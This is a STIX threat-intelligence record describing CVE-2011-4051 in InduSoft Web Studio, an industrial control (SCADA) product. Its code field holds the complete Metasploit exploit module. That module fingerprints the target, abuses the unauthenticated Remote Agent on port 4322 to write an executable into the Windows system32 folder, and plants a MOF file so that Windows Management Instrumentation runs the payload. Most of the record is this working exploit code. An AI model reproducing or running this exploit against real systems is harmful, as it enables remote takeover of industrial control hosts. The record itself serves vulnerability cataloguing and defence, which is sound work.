{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--12c51951-b8e3-47b8-9992-143e62a18a96",
    "created": "2024-08-14T16:39:33.975303Z",
    "modified": "2024-08-14T16:39:33.975307Z",
    "name": "InduSoft Web Studio Arbitrary Upload Remote Code Execution",
    "description": " This module exploits a lack of authentication and authorization on the InduSoft Web Studio Remote Agent, that allows a remote attacker to write arbitrary files to the filesystem, by abusing the functions provided by the software.  The module uses the Windows Management Instrumentation service to execute an arbitrary payload on vulnerable installations of InduSoft Web Studio on Windows pre Vista. It has been successfully tested on InduSoft Web Studio 6.1 SP6 over Windows XP SP3 and Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/indusoft_webstudio_exec.rb",
            "external_id": "indusoft_webstudio_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4051"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'InduSoft Web Studio Arbitrary Upload Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a lack of authentication and authorization on the InduSoft\n        Web Studio Remote Agent, that allows a remote attacker to write arbitrary files to\n        the filesystem, by abusing the functions provided by the software.\n\n        The module uses the Windows Management Instrumentation service to execute an\n        arbitrary payload on vulnerable installations of InduSoft Web Studio on Windows pre\n        Vista. It has been successfully tested on InduSoft Web Studio 6.1 SP6 over Windows\n        XP SP3 and Windows 2003 SP2.\n      },\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-4051' ],\n          [ 'OSVDB', '77179' ],\n          [ 'BID', '50675' ],\n          [ 'ZDI', '11-330' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'BadChars' => \"\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP / 2003', { } ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2011-11-04'))\n\n    register_options([Opt::RPORT(4322)])\n  end\n\n  def check\n    connect\n\n    # Get Application version\n    data = [0x14].pack(\"C\")\n    sock.put(data)\n    app_info = sock.get_once\n    disconnect\n\n    if app_info =~ /InduSoft Web Studio v6\\.1/\n      return Exploit::CheckCode::Appears\n    elsif app_info =~ /InduSoft Web Studio/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def upload_file(filename, my_payload)\n    connect\n\n    # Get Application version\n    data = [0x14].pack(\"C\")\n    sock.put(data)\n    app_info = sock.get_once\n    if app_info !~ /InduSoft Web Studio/\n      print_error(\"#{@peer} - InduSoft Web Sutio hasn't been detected, trying to exploit anyway...\")\n    end\n\n    # Get Operating System\n    data = [0x13].pack(\"C\")\n    sock.put(data)\n    os_info = sock.get_once\n    if os_info !~ /WINXP/ and os_info !~ /WIN2K3/\n      print_error(\"#{@peer} - Exploitation through Windows Management Instrumentation service only works on windows pre-vista system, trying to exploit anyway...\")\n    end\n\n    # Upload file\n\n    data = \"\\x02\\x37\" # Command => Select destination\n    data << [my_payload.length].pack(\"V\") # Data length\n    data << \"#{filename}\" # File name to upload\n    data << \"\\x09\\x00\\x30\\x00\\x00\\x00\"\n    data << \"\\x10\\x03\" # End of packet\n\n    # The data must be split on 1024 length chunks\n    offset = 0 # Data to send\n    count = 1 # Number of chunks sent\n    groups = 0 # Data must be sent in groups of 50 chunks\n\n    chunk = my_payload[offset, 1024]\n\n    while not chunk.nil?\n\n      # If there is a group of chunks, send it\n      if count % 51 == 0\n\n        data << \"\\x02\\x2c\" # Command => Send group of chunks\n        my_count = [count].pack(\"V\") # Number of chunks\n        data << my_count.gsub(/\\x10/, \"\\x10\\x10\")\n        data << \"\\x10\\x03\" # End of packet\n\n        sock.put(data)\n        res = sock.get_once\n        if res !~ /\\x02\\x06\\x10\\x03/\n          return res\n        end\n\n        count = count + 1\n        groups = groups + 1\n        data = \"\"\n\n      end\n\n      pkt = [ 0x02, 0x2e ].pack(\"C*\") # Command => Chunk Data\n      my_count = [count].pack(\"V\")\n      pkt << my_count.gsub(/\\x10/, \"\\x10\\x10\") # Chunk ID\n      pkt << [chunk.length].pack(\"V\").gsub(/\\x10/, \"\\x10\\x10\") # Chunk Data length\n      pkt << chunk.gsub(/\\x10/, \"\\x10\\x10\") # Chunk Data\n      pkt << \"\\x10\\x03\" # End of packet\n\n      data << pkt\n      offset = (count - groups) * 1024\n      chunk = my_payload[offset, 1024]\n      count = count + 1\n    end\n\n    pkt = [ 0x02, 0x03].pack(\"C*\") # Command => End of File\n    my_count = [count].pack(\"V\")\n    pkt << my_count.gsub(/\\x10/, \"\\x10\\x10\") # Chunk ID\n    pkt << rand_text_alpha(8) # LastWriteTime\n    pkt << rand_text_alpha(8) # LastAccessTime\n    pkt << rand_text_alpha(8) # CreationTime\n    pkt << \"\\x20\\x00\\x00\\x00\" # FileAttributes => FILE_ATTRIBUTE_ARCHIVE (0x20)\n    pkt << rand_text_alpha(1)\n    pkt << \"\\x10\\x03\" # End of packet\n    data << pkt\n\n    sock.put(data)\n    res = sock.get_once\n    disconnect\n\n    return res\n\n  end\n\n  def exploit\n\n    @peer = \"#{rhost}:#{rport}\"\n\n    exe = generate_payload_exe\n    exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n\n    mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n    mof      = generate_mof(mof_name, exe_name)\n\n    print_status(\"#{@peer} - Uploading the exe payload to C:\\\\WINDOWS\\\\system32\\\\#{exe_name}\")\n    res = upload_file(\"C:\\\\WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n    if res =~ /\\x02\\x06\\x10\\x03/\n      print_good \"#{@peer} - The exe payload has been uploaded successfully\"\n    else\n      print_error \"#{@peer} - Error uploading the exe payload\"\n      return\n    end\n\n    print_status(\"#{@peer} - Uploading the mof file to c:\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\")\n    res = upload_file(\"c:\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    if res =~ /\\x02\\x06\\x10\\x03/\n      print_good \"#{@peer} - The mof file has been uploaded successfully\"\n    else\n      print_error \"#{@peer} - Error uploading the mof file\"\n      return\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-04",
    "x_mitre_platforms": [
        "win'"
    ]
}